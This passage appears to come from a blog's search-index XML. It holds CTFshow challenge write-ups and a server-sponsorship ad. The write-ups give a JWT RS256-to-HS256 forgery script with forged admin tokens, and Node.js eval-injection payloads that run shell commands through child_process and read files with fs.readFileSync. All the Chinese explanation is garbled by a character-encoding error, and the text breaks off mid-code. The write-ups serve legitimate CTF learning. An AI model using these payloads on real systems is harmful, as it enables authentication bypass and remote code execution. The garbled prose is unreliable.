punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">"flag_here"</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> auth <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>auth<span class="token punctuation">;</span><span class="token keyword">var</span> cert <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public/public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// get public key</span>jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> cert<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> decoded</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>user<span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'you are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>‰ΩøÁî®‰∫ÜRS256Âä†ÂØÜÔºå‰ΩÜÊòØÂÖ¨ÁßÅÈí•ÈÉΩÂèØ‰ª•ËÆøÈóÆÂà∞</p><p>Âêå‰∏äÂ∑•ÂÖ∑</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjM2OTd9.tUleRykg1PvGpCF1_mpKka0XK0eYp0X68cYVDnexuzy1gHWlEnAtOqSuwSclFSeLqHPGhIuWWCbyMlLuj9H8E-wq2l3GZYIzbiDLjR6C0XDwVQqP2eSgP1E00bSedY-fJtsDD9Jwwk-Xu9sG5Zo56dkoUmo51vXuJimGiVj1HDU</code></pre><h4 id="web350-RS256-HS256"><a href="#web350-RS256-HS256" class="headerlink" title="web350(RS256 -&gt; HS256)"></a>web350(RS256 -&gt; HS256)</h4><p>ÂèØ‰ª•Ê†πÊçÆÂÖ¨Èí•Ôºå‰øÆÊîπÁÆóÊ≥ï‰ªé ÈùûÂØπÁß∞ÁÆóÊ≥ïÔºàÊØîÂ¶ÇRS256Ôºâ Âà∞ ÂØπÁß∞ÂØÜÈí•ÁÆóÊ≥ïÔºàHS256ÔºâÂèåÊñπÈÉΩ‰ΩøÁî®ÂÖ¨Èí•È™åÁ≠æÔºåÈ°∫Âà©ÁØ°ÊîπÊï∞ÊçÆ</p><p>ÂΩìÂÖ¨Èí•ÂèØ‰ª•ÊãøÂà∞Êó∂ÔºåÂ¶ÇÊûú‰ΩøÁî®ÂØπÁß∞ÂØÜÁ†ÅÔºåÂàôÂØπÈù¢‰ΩøÁî®Áõ∏ÂêåÁöÑÂÖ¨Èí•ËøõË°åËß£ÂØÜÔºåÂÆûÁé∞È™åÁ≠æÈÄöËøá</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\\public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// console.log(privateKey);</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="token punctuation">.</span>eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjUxMDl9<span class="token punctuation">.</span>M40dyhCvr5aIUAy_mEqCYJC8TAcbNrx02HOfhl<span class="token operator">-</span><span class="token constant">GRIU</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DKÁõæ-CTFersËµûÂä©ËÆ°Âàí</title>
      <link href="/2024/07/26/DK%E7%9B%BE/"/>
      <url>/2024/07/26/DK%E7%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="DKÁõæ-CTFersËµûÂä©ËÆ°ÂàíÊé®Âπø"><a href="#DKÁõæ-CTFersËµûÂä©ËÆ°ÂàíÊé®Âπø" class="headerlink" title="DKÁõæ-CTFersËµûÂä©ËÆ°ÂàíÊé®Âπø"></a>DKÁõæ-CTFersËµûÂä©ËÆ°ÂàíÊé®Âπø</h1><p>CTFersÂèØËé∑ÂæóDKÁõæËµûÂä©ÊúçÂä°Âô®ÔºåÈùûÂ∏∏‰πãÁâ©Áæé‰ª∑ÂªâÔºåÊ¨¢ËøéÂ∏àÂÇÖ‰ª¨</p><p><strong>ÂèÇ‰∏éÊù°‰ª∂Ôºö</strong></p><ol><li>ÂèÇ‰∏éËøá5‰∏™‰ª•‰∏äÂõΩÂÜÖCTFËµõ‰∫ãÔºåÈôÑ‰∏äÁõ∏ÂÖ≥ËØÅÊòé„ÄÇ</li><li>ÊØèÊúàÂú®‰∏™‰∫∫ÊäÄÊúØÂçöÂÆ¢‰∏äËá≥Â∞ëÊõ¥Êñ∞1ÁØáÂéüÂàõÊñáÁ´†ÔºàCTFÊäÄÊúØÁõ∏ÂÖ≥ÔºâÔºåÊÄªÈáè10ÁØá‰ª•‰∏ä„ÄÇ</li><li>ÂçöÂÆ¢Â∫ïÈÉ®ÊåÇÊúâDKÁõæËµûÂä©Ê†áËØÜÊàñÂèëÂ∏É‰∏ÄÁØáÊé®ÂπøÊñáÁ´†„ÄÇ</li></ol><p><strong>Áª≠Ë¥πÊù°‰ª∂Ôºö</strong></p><ol><li>Êª°Ë∂≥‰ª•‰∏äÂèÇ‰∏éÊù°‰ª∂ÁöÑÁ¨¨2ÂíåÁ¨¨3È°π„ÄÇ</li><li>ÁßØÊûÅÂèÇ‰∏éCTFËµõ‰∫ã„ÄÇ</li><li>ÊØèÊúàÁª≠Ë¥π1ÂÖÉ„ÄÇ</li></ol><p><strong>ÂçáÁ∫ßÊù°‰ª∂Ôºö</strong></p><ol><li>ÂçöÂÆ¢ÊñáÁ´†Êï∞ÈáèË¥®ÈáèÂíåËµõ‰∫ãÊéíÂêçÊúâÊâÄÊèêÈ´ò</li><li>Êé®ÂπøDKÁõæËΩØÊñá&#x2F;ÊµãËØÑ</li><li>ÊåâÂÆûÈôÖÈúÄÊ±Ç</li></ol><p><strong>CTFÂõ¢ÈòüÁ¶èÂà©Ôºö</strong></p><ul><li>È´òÈò≤CDN</li><li>È´òÈò≤Êú∫ÊüúÂÖçË¥πÊâòÁÆ°Á≠â</li></ul><h4 id="Êª°Ë∂≥Êù°‰ª∂ÁöÑÂ∏àÂÇÖÂèØ‰ª•ÂéªÂÆòÁΩëÊèê‰∫§Â∑•ÂçïÂ••"><a href="#Êª°Ë∂≥Êù°‰ª∂ÁöÑÂ∏àÂÇÖÂèØ‰ª•ÂéªÂÆòÁΩëÊèê‰∫§Â∑•ÂçïÂ••" class="headerlink" title="Êª°Ë∂≥Êù°‰ª∂ÁöÑÂ∏àÂÇÖÂèØ‰ª•ÂéªÂÆòÁΩëÊèê‰∫§Â∑•ÂçïÂ••"></a>Êª°Ë∂≥Êù°‰ª∂ÁöÑÂ∏àÂÇÖÂèØ‰ª•ÂéªÂÆòÁΩëÊèê‰∫§Â∑•ÂçïÂ••</h4><h3 id="QQ-Áæ§-727077055"><a href="#QQ-Áæ§-727077055" class="headerlink" title="QQ Áæ§: 727077055"></a>QQ Áæ§: 727077055</h3>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-nodejs</title>
      <link href="/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/"/>
      <url>/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/</url>
      
        <content type="html"><![CDATA[<p><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">ctf-nodejs‰πã‰∏Ä‰∫õÂ∞èÁü•ËØÜ</a></p><p><a href="https://xz.aliyun.com/t/7184?time__1311=n4+xnD0Dy737q4Yq7KDsA3rPoGCi1tTttrtO4D">Node.js Â∏∏ËßÅÊºèÊ¥ûÂ≠¶‰π†‰∏éÊÄªÁªì</a></p><h3 id="web334-344"><a href="#web334-344" class="headerlink" title="web334-344"></a>web334-344</h3><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>Êü•ÁúãÈôÑ‰ª∂Áªô‰∫ÜÊ∫êÁ†ÅÔºåÊÑüËßâËÄÉ‰∫ÜÁÆÄÂçïÁöÑ‰ª£Á†ÅÂÆ°ËÆ°</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../modules/user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">findUser</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">regenerate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ÁôªÂΩïÂ§±Ë¥•'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>             req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>loginUser <span class="token operator">=</span> user<span class="token punctuation">.</span>username<span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ÁôªÂΩïÊàêÂäü'</span><span class="token punctuation">,</span><span class="token literal-property property">ret_flag</span><span class="token operator">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'Ë¥¶Âè∑ÊàñÂØÜÁ†ÅÈîôËØØ'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// user.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">items</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span><span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'CTFSHOW'</span><span class="token punctuation">,</span> <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>ËøôÈáåÊúâ‰∏™ÂùëÔºåËøôÈáå‰∏çËÆ©Áõ¥Êé•Á≠â‰∫éCTFSHOWÔºåËÄåÊòØÂØπËæìÂÖ•ÁöÑnameËøõË°åÂ§ßÂÜôÂêéÊØîËæÉÔºåÊâÄ‰ª•<code>name=ctfshow</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="web335-child-process-execSync"><a href="#web335-child-process-execSync" class="headerlink" title="web335(child_process.execSync)"></a>web335(child_process.execSync)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span># @Author<span class="token operator">:</span> h1xa# @Date<span class="token operator">:</span>   <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">03</span><span class="token operator">:</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">21</span># @Last Modified by<span class="token operator">:</span>   h1xa# @Last Modified time<span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">06</span><span class="token operator">:</span><span class="token number">52</span><span class="token operator">:</span><span class="token number">38</span># @email<span class="token operator">:</span> h1xa@ctfer<span class="token punctuation">.</span>com# @link<span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ctfer<span class="token punctuation">.</span>com<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">CTFFSHOW</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"/javascripts/jquery.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    where is flag<span class="token operator">?</span>     <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">/</span><span class="token operator">?</span>eval<span class="token operator">=</span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>Âú®nodejs‰∏≠Ôºåeval()ÊñπÊ≥ïÁî®‰∫éËÆ°ÁÆóÂ≠óÁ¨¶‰∏≤ÔºåÂπ∂ÊääÂÆÉ‰Ωú‰∏∫ËÑöÊú¨‰ª£Á†ÅÊù•ÊâßË°åÔºåËØ≠Ê≥ï‰∏∫‚Äúeval(string)‚ÄùÔºõÂ¶ÇÊûúÂèÇÊï∞‰∏çÊòØÂ≠óÁ¨¶‰∏≤ÔºåËÄåÊòØÊï¥Êï∞ÊàñËÄÖÊòØFunctionÁ±ªÂûãÔºåÂàôÁõ¥Êé•ËøîÂõûËØ•Êï¥Êï∞ÊàñFunction„ÄÇ</p><p><a href="https://nodejs.cn/api/child_process.html">child_process</a>ÂÖ∑‰ΩìÁî®Ê≥ï</p><p><strong>child_process.execSync(command[, options])</strong></p><p><code>child_process.execSync()</code> ÊñπÊ≥ïÈÄöÂ∏∏‰∏é <a href="https://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback"><code>child_process.exec()</code></a> Áõ∏ÂêåÔºåÂè™ÊòØËØ•ÊñπÊ≥ïÂú®Â≠êËøõÁ®ãÂÆåÂÖ®ÂÖ≥Èó≠‰πãÂâç‰∏ç‰ºöËøîÂõû„ÄÇÂΩìÈÅáÂà∞Ë∂ÖÊó∂Âπ∂ÂèëÈÄÅ <code>killSignal</code> Êó∂ÔºåËØ•ÊñπÊ≥ïÂ∞ÜÂú®ËøõÁ®ãÂÆåÂÖ®ÈÄÄÂá∫‰πãÂâç‰∏ç‰ºöËøîÂõû„ÄÇÂ¶ÇÊûúÂ≠êËøõÁ®ãÊã¶Êà™Âπ∂Â§ÑÁêÜ‰∫Ü <code>SIGTERM</code> ‰ø°Âè∑Ê≤°ÊúâÈÄÄÂá∫ÔºåÁà∂ËøõÁ®ã‰ºö‰∏ÄÁõ¥Á≠âÂà∞Â≠êËøõÁ®ãÈÄÄÂá∫„ÄÇ</p><p>ÊâÄ‰ª•ÊûÑÈÄ†Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl00g.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">global</span><span class="token operator">.</span>process<span class="token operator">.</span>mainModule<span class="token operator">.</span>constructor<span class="token operator">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">)</span></code></pre><h4 id="web336-fs-readFileSync-ÂèçÂºπshell"><a href="#web336-fs-readFileSync-ÂèçÂºπshell" class="headerlink" title="web336(fs.readFileSync  ÂèçÂºπshell)"></a>web336(fs.readFileSync  ÂèçÂºπshell)</h4><p>__filename Ë°®Á§∫ÂΩìÂâçÊ≠£Âú®ÊâßË°åÁöÑËÑöÊú¨ÁöÑÊñá‰ª∂Âêç„ÄÇÂÆÉÂ∞ÜËæìÂá∫Êñá‰ª∂ÊâÄÂú®‰ΩçÁΩÆÁöÑÁªùÂØπË∑ØÂæÑÔºå‰∏îÂíåÂëΩ‰ª§Ë°åÂèÇÊï∞ÊâÄÊåáÂÆöÁöÑÊñá‰ª∂Âêç‰∏ç‰∏ÄÂÆöÁõ∏Âêå„ÄÇ Â¶ÇÊûúÂú®Ê®°Âùó‰∏≠ÔºåËøîÂõûÁöÑÂÄºÊòØÊ®°ÂùóÊñá‰ª∂ÁöÑË∑ØÂæÑ„ÄÇ dirname Ë°®Á§∫ÂΩìÂâçÊâßË°åËÑöÊú¨ÊâÄÂú®ÁöÑÁõÆÂΩï„ÄÇ</p><p>ÊâÄ‰ª•<code>?eval=__filename</code>ÁúãÂà∞Êñá‰ª∂&#x2F;app&#x2F;routes&#x2F;index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>html<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> evalstring <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>string<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> evalstring<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">exec|load</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>tql<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token function">eval</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>ÁÑ∂Âêé‰º†ÂÖ•</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readdireSync</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./routes/index.js'</span><span class="token punctuation">)</span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞Ê∫êÁ†ÅÔºåÂèëÁé∞ËøáÊª§‰∫Ü<code>exec</code> Âíå<code>load</code></p><p>ÂÖ∂ÂÆûÂ∑≤ÁªèÂèØ‰ª•ËØªÊñá‰ª∂‰∫ÜÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ËØªflag</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token 